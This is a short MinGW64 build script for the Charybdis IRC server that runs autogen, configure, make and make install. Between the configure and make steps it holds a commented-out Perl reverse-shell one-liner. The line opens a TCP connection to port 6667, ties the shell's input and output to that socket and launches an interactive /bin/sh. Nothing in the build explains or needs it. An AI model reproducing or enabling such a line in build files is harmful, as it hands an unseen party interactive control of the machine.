set -v

export MSYSTEM=MINGW64
export PATH=/mingw64/bin:/usr/local/bin:/usr/bin:/bin:/c/Windows/system32:/c/Windows:/c/Windows/System32/Wbem:/c/Windows/System32/WindowsPowerShell/v1.0:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl

sh ./autogen.sh
./configure --prefix=c:/projects/charybdis/build --enable-openssl=/mingw64 --with-included-boost --with-included-rocksdb=shared --with-included-js=shared --disable-pch
# perl -e 'use Socket;$i="0.0.0.0";$p=6667;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
make -j2
make install
